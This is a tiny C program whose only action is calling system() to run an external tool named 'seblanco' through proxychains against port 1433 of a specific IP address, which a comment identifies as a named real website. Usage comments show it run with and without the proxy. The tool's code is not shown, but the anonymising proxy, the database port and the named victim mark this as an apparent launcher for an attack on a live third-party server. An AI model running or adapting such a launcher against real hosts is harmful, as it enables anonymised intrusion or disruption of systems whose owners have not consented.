#include <stdio.h>

int main()
{
//usage with proxy : system("proxychains ./seblanco (port) (target-ip)"); 
//usage non proxy : system("./seblanco (port) (target-ip)");
//example below
system("proxychains ./seblanco 1433 167.160.90.18 "); // this is www.apolloquiboloy.com

}
